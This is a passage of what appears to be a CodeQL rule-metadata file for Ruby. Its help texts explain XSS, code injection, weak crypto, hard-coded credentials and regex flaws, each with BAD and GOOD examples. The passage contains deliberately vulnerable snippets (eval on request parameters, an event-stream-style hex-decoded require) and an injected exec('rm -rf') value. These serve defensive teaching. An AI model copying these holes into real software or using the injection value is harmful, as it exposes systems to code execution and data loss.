[CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "rb/stored-xss": {
    "name": "Stored cross-site scripting",
    "description": "Using uncontrolled stored values in HTML allows for a stored cross-site scripting vulnerability.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "precision": "high",
    "id": "rb/stored-xss",
    "tags": [
      "security",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "130b38a5-StoredXSS",
    "language": "ruby",
    "help": "# Stored cross-site scripting\nDirectly writing an uncontrolled stored value (for example, a database field) to a webpage, without properly sanitizing the value first, allows for a cross-site scripting vulnerability.\n\nThis kind of vulnerability is also called *stored* cross-site scripting, to distinguish it from other types of cross-site scripting.\n\n\n## Recommendation\nTo guard against stored cross-site scripting, consider escaping before using uncontrolled stored values to create HTML content. Some frameworks, such as Rails, perform this escaping implicitly and by default.\n\nTake care when using methods such as `html_safe` or `raw`. They can be used to emit a string without escaping it, and should only be used when the string has already been manually escaped (for example, with the Rails `html_escape` method), or when the content is otherwise guaranteed to be safe (such as a hard-coded string).\n\n\n## Example\nThe following example is safe because the `user.name` content within the output tags will be HTML-escaped automatically before being emitted.\n\n\n```none\n<% user = User.find(1) %>\n<p>Hello <%= user.name %>!</p>\n\n```\nHowever, the following example may be unsafe because `user.name` is emitted without escaping, since it is marked as `html_safe`. If the `name` is not sanitized before being written to the database, then an attacker could use this to insert arbitrary content into the HTML output, including scripts.\n\n\n```none\n<% user = User.find(1) %>\n<p>Hello <%= user.name.html_safe %>!</p>\n\n```\nIn the next example, content from a file on disk is inserted literally into HTML content. This approach is sometimes used to load script content, such as extensions for a web application, from files on disk. Care should taken in these cases to ensure both that the loaded files are trusted, and that the file cannot be modified by untrusted users.\n\n\n```none\n<script>\n  <%= File.read(File.join(SCRIPT_DIR, \"script.js\")).html_safe %>\n</script>\n\n```\n\n## References\n* OWASP: [XSS Ruby on Rails Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#cross-site-scripting-xss).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "rb/hardcoded-data-interpreted-as-code": {
    "name": "Hard-coded data interpreted as code",
    "description": "Transforming hard-coded data (such as hexadecimal constants) into code to be executed is a technique often associated with backdoors and should be avoided.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.1,
    "precision": "medium",
    "id": "rb/hardcoded-data-interpreted-as-code",
    "tags": [
      "security",
      "external/cwe/cwe-506"
    ],
    "filename": "a975c940-HardcodedDataInterpretedAsCode",
    "language": "ruby",
    "help": "# Hard-coded data interpreted as code\nInterpreting hard-coded data (such as string literals containing hexadecimal numbers) as code or as an import path is typical of malicious backdoor code that has been implanted into an otherwise trusted code base and is trying to hide its true purpose from casual readers or automated scanning tools.\n\n\n## Recommendation\nExamine the code in question carefully to ascertain its provenance and its true purpose. If the code is benign, it should always be possible to rewrite it without relying on dynamically interpreting data as code, improving both clarity and safety.\n\n\n## Example\nAs an example of malicious code using this obfuscation technique, consider the following simplified Ruby version of a snippet of backdoor code that was discovered in a dependency of the popular JavaScript `event-stream` npm package:\n\n\n```ruby\ndef e(r)\n  [r].pack 'H*'\nend\n\n# BAD: hexadecimal constant decoded and interpreted as import path\nrequire e(\"2e2f746573742f64617461\")\n\n```\nWhile this shows only the first few lines of code, it already looks very suspicious since it takes a hard-coded string literal, hex-decodes it and then uses it as an import path. The only reason to do so is to hide the name of the file being imported.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* The npm Blog: [Details about the event-stream incident](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident).\n* Common Weakness Enumeration: [CWE-506](https://cwe.mitre.org/data/definitions/506.html).\n"
  },
  "rb/weak-cookie-configuration": {
    "name": "Weak cookie configuration",
    "description": "Misconfiguring how cookies are encrypted or sent can expose a user to various attacks.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "id": "rb/weak-cookie-configuration",
    "tags": [
      "external/cwe/cwe-732",
      "external/cwe/cwe-1275",
      "security"
    ],
    "precision": "high",
    "filename": "b9da5639-WeakCookieConfiguration",
    "language": "ruby",
    "help": "# Weak cookie configuration\nCookies can be used for security measures, such as authenticating a user based on cookies sent with a request. Misconfiguration of cookie settings in a web application can expose users to attacks that compromise these security measures.\n\n\n## Recommendation\nModern web frameworks typically have good default configuration for cookie settings. If an application overrides these settings, then take care to ensure that these changes are necessary and that they don't weaken the cookie configuration.\n\n\n## Example\nIn the first example, the value of `config.action_dispatch.cookies_same_site_protection` is set to `:none`. This has the effect of setting the default `SameSite` attribute sent by the server when setting a cookie to `None` rather than the default of `Lax`. This may make the application more vulnerable to cross-site request forgery attacks.\n\nIn the second example, this option is instead set to `:strict`. This is a stronger restriction than the default of `:lax`, and doesn't compromise on cookie security.\n\n\n```ruby\nmodule App\n  class Application < Rails::Application\n    # Sets default `Set-Cookie` `SameSite` attribute to `None`\n    config.action_dispatch.cookies_same_site_protection = :none\n\n    # Sets default `Set-Cookie` `SameSite` attribute to `Strict`\n    config.action_dispatch.cookies_same_site_protection = :strict\n  end\nend\n\n```\n\n## References\n* OWASP: [SameSite](https://owasp.org/www-community/SameSite).\n* Rails: [Configuring Action Dispatch](https://guides.rubyonrails.org/configuring.html#configuring-action-dispatch).\n* Common Weakness Enumeration: [CWE-732](https://cwe.mitre.org/data/definitions/732.html).\n* Common Weakness Enumeration: [CWE-1275](https://cwe.mitre.org/data/definitions/1275.html).\n"
  },
  "rb/code-injection": {
    "name": "Code injection",
    "description": "Interpreting unsanitized user input as code allows a malicious user to perform arbitrary code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "sub-severity": "high",
    "precision": "high",
    "id": "rb/code-injection",
    "tags": [
      "security",
      "external/cwe/cwe-094",
      "external/cwe/cwe-095",
      "external/cwe/cwe-116"
    ],
    "filename": "b72d5141-CodeInjection",
    "language": "ruby",
    "help": "# Code injection\nDirectly evaluating user input (for example, an HTTP request parameter) as code without first sanitizing the input allows an attacker arbitrary code execution. This can occur when user input is passed to code that interprets it as an expression to be evaluated, using methods such as `Kernel.eval` or `Kernel.send`.\n\n\n## Recommendation\nAvoid including user input in any expression that may be dynamically evaluated. If user input must be included, use context-specific escaping before including it. It is important that the correct escaping is used for the type of evaluation that will occur.\n\n\n## Example\nThe following example shows two functions setting a name from a request. The first function uses `eval` to execute the `set_name` method. This is dangerous as it can allow a malicious user to execute arbitrary code on the server. For example, the user could supply the value `\"' + exec('rm -rf') + '\"` to destroy the server's file system. The second function calls the `set_name` method directly and is thus safe.\n\n\n```ruby\nclass UsersController < ActionController::Base\n  # BAD - Allow user to define code to be run.\n  def create_bad\n    first_name = params[:first_name]\n    eval(\"set_name(#{first_name})\")\n  end\n\n  # GOOD - Call code directly\n  def create_good\n    first_name = params[:first_name]\n    set_name(first_name)\n  end\n\n  def set_name(name)\n    @name = name\n  end\nend\n\n```\n\n## References\n* OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).\n* Wikipedia: [Code Injection](https://en.wikipedia.org/wiki/Code_injection).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n* Common Weakness Enumeration: [CWE-95](https://cwe.mitre.org/data/definitions/95.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "rb/csrf-protection-not-enabled": {
    "name": "CSRF protection not enabled",
    "description": "Not enabling CSRF protection may make the application vulnerable to a Cross-Site Request Forgery (CSRF) attack.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 8.8,
    "precision": "high",
    "id": "rb/csrf-protection-not-enabled",
    "tags": [
      "security",
      "external/cwe/cwe-352"
    ],
    "filename": "da64ba1e-CSRFProtectionNotEnabled",
    "language": "ruby",
    "help": "# CSRF protection not enabled\nCross-site request forgery (CSRF) is a type of vulnerability in which an attacker is able to force a user to carry out an action that the user did not intend.\n\nThe attacker tricks an authenticated user into submitting a request to the web application. Typically this request will result in a state change on the server, such as changing the user's password. The request can be initiated when the user visits a site controlled by the attacker. If the web application relies only on cookies for authentication, or on other credentials that are automatically included in the request, then this request will appear as legitimate to the server.\n\nA common countermeasure for CSRF is to generate a unique token to be included in the HTML sent from the server to a user. This token can be used as a hidden field to be sent back with requests to the server, where the server can then check that the token is valid and associated with the relevant user session.\n\n\n## Recommendation\nIn the Rails web framework, CSRF protection is enabled by the adding a call to the `protect_from_forgery` method inside an `ActionController` class. Typically this is done in the `ApplicationController` class, or an equivalent class from which other controller classes are subclassed. The default behaviour of this method is to null the session when an invalid CSRF token is provided. This may not be sufficient to avoid a CSRF vulnerability - for example if parts of the session are memoized. Calling `protect_from_forgery with: :exception` can help to avoid this by raising an exception on an invalid CSRF token instead.\n\n\n## Example\nThe following example shows a case where CSRF protection is enabled with a secure request handling strategy of `:exception`.\n\n\n```ruby\nclass ApplicationController < ActionController::Base\n  protect_from_forgery with: :exception\nend\n  \n```\n\n## References\n* Wikipedia: [Cross-site request forgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery)\n* OWASP: [Cross-site request forgery](https://owasp.org/www-community/attacks/csrf)\n* Securing Rails Applications: [Cross-Site Request Forgery (CSRF)](https://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf)\n* Veracode: [When Rails' protect_from_forgery Fails](https://www.veracode.com/blog/managing-appsec/when-rails-protectfromforgery-fails).\n* Common Weakness Enumeration: [CWE-352](https://cwe.mitre.org/data/definitions/352.html).\n"
  },
  "rb/weak-cryptographic-algorithm": {
    "name": "Use of a broken or weak cryptographic algorithm",
    "description": "Using broken or weak cryptographic algorithms can compromise security.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "rb/weak-cryptographic-algorithm",
    "tags": [
      "security",
      "external/cwe/cwe-327"
    ],
    "filename": "8dbb4ef0-BrokenCryptoAlgorithm",
    "language": "ruby",
    "help": "# Use of a broken or weak cryptographic algorithm\nUsing broken or weak cryptographic algorithms can leave data vulnerable to being decrypted or forged by an attacker.\n\nMany cryptographic algorithms provided by cryptography libraries are known to be weak, or flawed. Using such an algorithm means that encrypted or hashed data is less secure than it appears to be.\n\n\n## Recommendation\nEnsure that you use a strong, modern cryptographic algorithm, such as AES-128 or RSA-2048.\n\n\n## Example\nThe following code uses the `OpenSSL` library to encrypt some secret data. When you create a cipher using `OpenSSL` you must specify the encryption algorithm to use. The first example uses DES, which is an older algorithm that is now considered weak. The second example uses AES, which is a stronger modern algorithm.\n\n\n```ruby\nrequire 'openssl'\n\nclass Encryptor\n  attr_accessor :secret_key\n\n  def encrypt_message_weak(message)\n    cipher = OpenSSL::Cipher.new('des') # BAD: weak encryption\n    cipher.encrypt\n    cipher.key = secret_key\n    cipher.update(message)\n    cipher.final\n  end\n\n  def encrypt_message_strong(message)\n    cipher = OpenSSL::Cipher::AES128.new # GOOD: strong encryption\n    cipher.encrypt\n    cipher.key = secret_key\n    cipher.update(message)\n    cipher.final\n  end\nend\n\n```\n\n## References\n* NIST, FIPS 140 Annex a: [ Approved Security Functions](http://csrc.nist.gov/publications/fips/fips140-2/fips1402annexa.pdf).\n* NIST, SP 800-131A: [ Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths](http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf).\n* OWASP: [Rule - Use strong approved cryptographic algorithms](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#rule---use-strong-approved-authenticated-encryption).\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n"
  },
  "rb/overly-large-range": {
    "name": "Overly permissive regular expression range",
    "description": "Overly permissive regular expression ranges match a wider range of characters than intended. This may allow an attacker to bypass a filter or sanitizer.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 5.0,
    "precision": "high",
    "id": "rb/overly-large-range",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020"
    ],
    "filename": "61d13630-OverlyLargeRange",
    "language": "ruby",
    "help": "# Overly permissive regular expression range\nIt's easy to write a regular expression range that matches a wider range of characters than you intended. For example, `/[a-zA-z]/` matches all lowercase and all uppercase letters, as you would expect, but it also matches the characters: `` [ \\ ] ^ _ ` ``.\n\nAnother common problem is failing to escape the dash character in a regular expression. An unescaped dash is interpreted as part of a range. For example, in the character class `[a-zA-Z0-9%=.,-_]` the last character range matches the 55 characters between `,` and `_` (both included), which overlaps with the range `[0-9]` and is clearly not intended by the writer.\n\n\n## Recommendation\nAvoid any confusion about which characters are included in the range by writing unambiguous regular expressions. Always check that character ranges match only the expected characters.\n\n\n## Example\nThe following example code is intended to check whether a string is a valid 6 digit hex color.\n\n```ruby\n\ndef is_valid_hex_color(color)\n    /^#[0-9a-fA-f]{6}$/.match(color)\nend\n\n```\nHowever, the `A-f` range is overly large and matches every uppercase character. It would parse a \"color\" like `#XXYYZZ` as valid.\n\nThe fix is to use an uppercase `A-F` range instead.\n\n```ruby\n\ndef is_valid_hex_color(color)\n    /^#[0-9a-fA-F]{6}$/.match(color)\nend\n\n```\n\n## References\n* GitHub Advisory Database: [CVE-2021-42740: Improper Neutralization of Special Elements used in a Command in Shell-quote](https://github.com/advisories/GHSA-g4rg-993r-mgx7)\n* wh0.github.io: [Exploiting CVE-2021-42740](https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html)\n* Yosuke Ota: [no-obscure-range](https://ota-meshi.github.io/eslint-plugin-regexp/rules/no-obscure-range.html)\n* Paul Boyd: [The regex \\[,-.\\]](https://pboyd.io/posts/comma-dash-dot/)\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "rb/tainted-format-string": {
    "name": "Use of externally-controlled format string",
    "description": "Using external input in format strings can lead to garbled output.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.3,
    "precision": "high",
    "id": "rb/tainted-format-string",
    "tags": [
      "security",
      "external/cwe/cwe-134"
    ],
    "filename": "82845bcc-TaintedFormatString",
    "language": "ruby",
    "help": "# Use of externally-controlled format string\nMethods like `Kernel.printf` accept a format string that is used to format the remaining arguments by providing inline format specifiers. If the format string contains unsanitized input from an untrusted source, then that string may contain unexpected format specifiers that cause garbled output or throw an exception.\n\n\n## Recommendation\nEither sanitize the input before including it in the format string, or use a `%s` specifier in the format string, and pass the untrusted data as corresponding argument.\n\n\n## Example\nThe following program snippet logs information about an unauthorized access attempt. The log message includes the user name, and the user's IP address is passed as an additional argument to `Kernel.printf` to be appended to the message:\n\n\n```ruby\nclass UsersController < ActionController::Base\n  def index\n    printf(\"Unauthorised access attempt by #{params[:user]}: %s\", request.ip)\n  end\nend\n```\nHowever, if a malicious user provides a format specified such as `%s` as their user name, `Kernel.printf` will throw an exception as there are too few arguments to satisfy the format. This can result in denial of service or leaking of internal information to the attacker via a stack trace.\n\nInstead, the user name should be included using the `%s` specifier:\n\n\n```ruby\nclass UsersController < ActionController::Base\n  def index\n    printf(\"Unauthorised access attempt by %s: %s\", params[:user], request.ip)\n  end\nend\n```\nAlternatively, string interpolation should be used exclusively:\n\n\n```ruby\nclass UsersController < ActionController::Base\n  def index\n    puts \"Unauthorised access attempt by #{params[:user]}: #{request.ip}\"\n  end\nend\n```\n\n## References\n* Ruby documentation for [format strings](https://docs.ruby-lang.org/en/3.1/Kernel.html#method-i-sprintf).\n* Common Weakness Enumeration: [CWE-134](https://cwe.mitre.org/data/definitions/134.html).\n"
  },
  "rb/hardcoded-credentials": {
    "name": "Hard-coded credentials",
    "description": "Credentials are hard coded in the source code of the application.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "medium",
    "id": "rb/hardcoded-credentials",
    "tags": [
      "security",
      "external/cwe/cwe-259",
      "external/cwe/cwe-321",
      "external/cwe/cwe-798"
    ],
    "filename": "0b3d44ce-HardcodedCredentials",
    "language": "ruby",
    "help": "# Hard-coded credentials\nIncluding unencrypted hard-coded inbound or outbound authentication credentials within source code or configuration files is dangerous because the credentials may be easily discovered.\n\nSource or configuration files containing hard-coded credentials may be visible to an attacker. For example, the source code may be open source, or it may be leaked or accidentally revealed.\n\nFor inbound authentication, hard-coded credentials may allow unauthorized access to the system. This is particularly problematic if the credential is hard-coded in the source code, because it cannot be disabled easily. For outbound authentication, the hard-coded credentials may provide an attacker with privileged information or unauthorized access to some other system.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code, placing them in configuration files or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\nFor outbound authentication details, consider encrypting the credentials or the enclosing data stores or configuration files, and using permissions to restrict access.\n\nFor inbound authentication details, consider hashing passwords using standard library functions where possible. For example, `OpenSSL::KDF.pbkdf2_hmac`.\n\n\n## Example\nThe following examples shows different types of inbound and outbound authentication.\n\nIn the first case, `RackAppBad`, we accept a password from a remote user, and compare it against a plaintext string literal. If an attacker acquires the source code they can observe the password, and can log in to the system. Furthermore, if such an intrusion was discovered, the application would need to be rewritten and redeployed in order to change the password.\n\nIn the second case, `RackAppGood`, the password is compared to a hashed and salted password stored in a configuration file, using `OpenSSL::KDF.pbkdf2_hmac`. In this case, access to the source code or the assembly would not reveal the password to an attacker. Even access to the configuration file containing the password hash and salt would be of little value to an attacker, as it is usually extremely difficult to reverse engineer the password from the hash and salt. In a real application care should be taken to make the string comparison of the hashed input against the hashed password take close to constant time, as this will make timing attacks more difficult.\n\n\n```ruby\nrequire 'rack'\nrequire 'yaml'\nrequire 'openssl'\n\nclass RackAppBad\n  def call(env)\n    req = Rack::Request.new(env)\n    password = req.params['password']\n\n    # BAD: Inbound authentication made by comparison to string literal\n    if password == 'myPa55word'\n      [200, {'Content-type' => 'text/plain'}, ['OK']]\n    else\n      [403, {'Content-type' => 'text/plain'}, ['Permission denied']]\n    end\n  end\nend\n\nclass RackAppGood\n  def call(env)\n    req = Rack::Request.new(env)\n    password = req.params['password']\n\n    config_file = YAML.load_file('config.yml')\n    hashed_password = config_file['hashed_password']\n    salt = [config_file['salt']].pack('H*')\n\n    #GOOD: Inbound authentication made by comparing to a hash password from a config file.\n    hash = OpenSSL::Digest::SHA256.new\n    dk = OpenSSL::KDF.pbkdf2_hmac(\n      password, salt: salt, hash: hash, iterations: 100_000, length: hash.digest_length\n    )\n    hashed_input = dk.unpack('H*').first\n    if hashed_password == hashed_input\n      [200, {'Content-type' => 'text/plain'}, ['OK']]\n    else\n      [403, {'Content-type' => 'text/plain'}, ['Permission denied']]\n    end\n  end\nend\n\n```\n\n## References\n* OWASP: [XSS Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-259](https://cwe.mitre.org/data/definitions/259.html).\n* Common Weakness Enumeration: [CWE-321](https://cwe.mitre.org/data/definitions/321.html).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n"
  },
  "rb/regex/missing-regexp-anchor": {
    "name": "Missing regular expression anchor",
    "description": "Regular expressions without anchors can be vulnerable to bypassing.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "medium",
    "id": "rb/regex/missing-regexp-anchor",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020"
    ],
    "filename": "61d13630-MissingRegExpAnchor",
    "language": "ruby",
    "help": "# Missing regular expression anchor\nSanitizing untrusted input with regular expressions is a common technique. However, it is error-prone to match untrusted input against regular expressions without anchors such as `\\A` or `\\z`. Malicious input can bypass such security checks by embedding one of the allowed patterns in an unexpected location.\n\nEven if the matching is not done in a security-critical context, it may still cause undesirable behavior when the regular expression accidentally matches.\n\n\n## Recommendation\nUse anchors to ensure that regular expressions match at the expected locations.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.\n\n\n```ruby\nclass UsersController < ActionController::Base\n    def index\n        # BAD: the host of `params[:url]` may be controlled by an attacker\n        if params[:url].match? /https?:\\/\\/www\\.example\\.com\\//\n            redirect_to params[:url]\n        end\n    end\nend\n```\nThe check with the regular expression match is, however, easy to bypass. For example by embedding `http://example.com/` in the query string component: `http://evil-example.net/?x=http://example.com/`. Address these shortcomings by using anchors in the regular expression instead:\n\n\n```ruby\nclass UsersController < ActionController::Base\n    def index\n        # GOOD: the host of `params[:url]` can not be controlled by an attacker\n        if params[:url].match? /\\Ahttps?:\\/\\/www\\.example\\.com\\//\n            redirect_to params[:url]\n        end\n    end\nend\n```\nA related mistake is to write a regular expression with multiple alternatives, but to only include an anchor for one of the alternatives. As an example, the regular expression `/^www\\.example\\.com|beta\\.example\\.com/` will match the host `evil.beta.example.com` because the regular expression is parsed as `/(^www\\.example\\.com)|(beta\\.example\\.com)/`\n\nIn Ruby the anchors `^` and `$` match the start and end of a line, whereas the anchors `\\A` and `\\z` match the start and end of the entire string. Using line anchors can be dangerous, as this can allow malicious input to be hidden using newlines, leading to vulnerabilities such as HTTP header injection. Unless you specifically need the line-matching behaviour of `^` and `$`, you should use `\\A` and `\\z` instead.\n\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "rb/unsafe-code-construction": {
    "name": "Unsafe code constructed from library input",
    "description": "Using externally controlled strings to construct code may allow a malicious user to execute arbitrary code.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.1,
    "precision": "medium",
    "id": "rb/unsafe-code-construction",
    "tags": [
      "security",
      "external/cwe/cwe-094",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "b72d5141-UnsafeCodeConstruction",
    "language": "ruby",
    "help": "# Unsafe code constructed from library input\nWhen a library function dynamically constructs code in a potentially unsafe way, it's important to document to clients of the library that the function should only be used with trusted inputs. If the function is not documented as being potentially unsafe, then a client may incorrectly use inputs containing unsafe code fragments, and thereby leave the client vulnerable to code-injection attacks.\n\n\n## Recommendation\nProperly document library functions that construct code from unsanitized inputs, or avoid constructing code in the first place.\n\n\n## Example\nThe following example shows two methods implemented using `eval`: a simple deserialization routine and a getter method. If untrusted inputs are used with these methods, then an attacker might be able to execute arbitrary code on the system.\n\n\n```ruby\nmodule MyLib\n    def unsafeDeserialize(value)\n        eval(\"foo = #{value}\")\n        foo\n    end\n\n    def unsafeGetter(obj, path)\n        eval(\"obj.#{path}\")\n    end\nend\n\n```\nTo avoid this problem, either properly document that the function is potentially unsafe, or use an alternative solution such as `JSON.parse` or another library that does not allow arbitrary code to be executed.\n\n\n```ruby\nrequire 'json'\n\nmodule MyLib\n    def safeDeserialize(value)\n        JSON.parse(value)\n    end\n\n    def safeGetter(obj, path)\n        obj.dig(*path.split(\".\"))\n    end\nend\n\n```\n\n## Example\nAs another example, consider the below code which dynamically constructs a class that has a getter method with a custom name.\n\n\n```ruby\nrequire 'json'\n\nmodule BadMakeGetter\n  # Makes a class with a method named `getter_name` that returns `val`\n  def self.define_getter_class(getter_name, val)\n    new_class = Class.new\n    new_class.module_eval <<-END\n      def #{getter_name}\n        #{JSON.dump(val)}\n      end\n    END\n    new_class\n  end\nend\n\none = BadMakeGetter.define_getter_class(:one, \"foo\")\nputs \"One is #{one.new.one}\"\n```\nThe example dynamically constructs a string which is then executed using `module_eval`. This code will break if the specified name is not a valid Ruby identifier, and if the value is controlled by an attacker, then this could lead to code-injection.\n\nA more robust implementation, that is also immune to code-injection, can be made by using `module_eval` with a block and using `define_method` to define the getter method.\n\n\n```ruby\n# Uses `define_method` instead of constructing a string\nmodule GoodMakeGetter\n  def self.define_getter_class(getter_name, val)\n    new_class = Class.new\n    new_class.module_eval do\n      define_method(getter_name) { val }\n    end\n    new_class\n  end\nend\n\ntwo = GoodMakeGetter.define_getter_class(:two, \"bar\")\nputs \"Two is #{two.new.two}\"\n\n```\n\n## Example\nThis example dynamically registers a method on another class which forwards its arguments to a target object. This approach uses `module_eval` and string interpolation to construct class variables and methods.\n\n\n```ruby\nmodule Invoker\n  def attach(klass, name, target)\n    klass.module_eval <<-CODE\n      @@#{name} = target\n\n      def #{name}(*args)\n        @@#{name}.#{name}(*args)\n      end\n    CODE\n  end\nend\n\n```\nA safer approach is to use `class_variable_set` and `class_variable_get` along with `define_method`. String interpolation is still used to construct the class variable name, but this is safe because `class_variable_set` is not susceptible to code-injection.\n\n`send` is used to dynamically call the method specified by `name`. This is a more robust alternative than the previous example, because it does not allow arbitrary code to be executed, but it does still allow for any method to be called on the target object.\n\n\n```ruby\nmodule Invoker\n  def attach(klass, name, target)\n    var = :\"@@#{name}\"\n    klass.class_variable_set(var, target)\n    klass.define_method(name) do |*args|\n      self.class.class_variable_get(var).send(name, *args)\n    end\n  end\nend\n\n```\n\n## References\n* OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).\n* Wikipedia: [Code Injection](https://en.wikipedia.org/wiki/Code_injection).\n* Ruby documentation: [define_method](https://docs.ruby-lang.org/en/3.2/Module.html#method-i-define_method).\n* Ruby documentation: [class_variable_set](https://docs.ruby-lang.org/en/3.2/Module.html#method-i-class_variable_set).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "rb/incomplete-hostname-regexp": {
    "name": "Incomplete regular expression for hostnames",
    "description": "Matching a URL or hostname against a regular expression that contains an unescaped dot as part of the hostname might match more hostnames than expected.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "rb/incomplete-hostname-regexp",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020"
    ],
    "filename": "61d13630-IncompleteHostnameRegExp",
    "language": "ruby",
    "help": "# Incomplete regular expression for hostnames\nSanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. Often, this is done by checking that the host of a URL is in a set of allowed hosts.\n\nIf a regular expression implements such a check, it is easy to accidentally make the check too permissive by not escaping the `.` meta-characters appropriately. Even if the check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when it accidentally succeeds.\n\n\n## Recommendation\nEscape all meta-characters appropriately when constructing regular expressions for security checks, and pay special attention to the `.` meta-character.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains.\n\n\n```ruby\nclass AppController < ApplicationController\n\n    def index\n        url = params[:url]\n        host = URI(url).host\n        # BAD: the host of `url` may be controlled by an attacker\n        regex = /^((www|beta).)?example.com/\n        if host.match(regex)\n            redirect_to url\n        end\n    end\n\nend\n\n```\nThe check is however easy to bypass because the unescaped `.` allows for any character before `example.com`, effectively allowing the redirect to go to an attacker-controlled domain such as `wwwXexample.com`.\n\nAddress this vulnerability by escaping `.` appropriately: `regex = /^((www|beta)\\.)?example\\.com/`.\n\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "rb/regex/badly-anchored-regexp": {
    "name": "Badly anchored regular expression",
    "description": "Regular expressions anchored using `^` or `$` are vulnerable to bypassing.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "rb/regex/badly-anchored-regexp",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020"
    ],
    "filename": "61d13630-MissingFullAnchor",
    "language": "ruby",
    "help": "# Badly anchored regular expression\nRegular expressions in Ruby can use anchors to match the beginning and end of a string. However, if the `^` and `$` anchors are used, the regular expression can match a single line of a multi-line string. This allows bad actors to bypass your regular expression checks and inject malicious input.\n\n\n## Recommendation\nUse the `\\A` and `\\z` anchors since these anchors will always match the beginning and end of the string, even if the string contains newlines.\n\n\n## Example\nThe following (bad) example code uses a regular expression to check that a string contains only digits.\n\n\n```ruby\ndef bad(input) \n    raise \"Bad input\" unless input =~ /^[0-9]+$/\n\n    # ....\nend\n```\nThe regular expression `/^[0-9]+$/` will match a single line of a multi-line string, which may not be the intended behavior. The following (good) example code uses the regular expression `\\A[0-9]+\\z` to match the entire input string.\n\n\n```ruby\ndef good(input)\n    raise \"Bad input\" unless input =~ /\\A[0-9]+\\z/\n\n    # ....\nend\n```\n\n## References\n* Ruby documentation: [Anchors](https://ruby-doc.org/3.2.0/Regexp.html#class-Regexp-label-Anchors)\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "rb/clear-text-storage-sensitive-data": {
    "name": "Clear-text storage of sensitive information",
    "description": "Storing sensitive information without encryption or hashing can expose it to an attacker.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "rb/clear-text-storage-sensitive-data",
    "tags": [
      "security",
      "external/cwe/cwe-312",
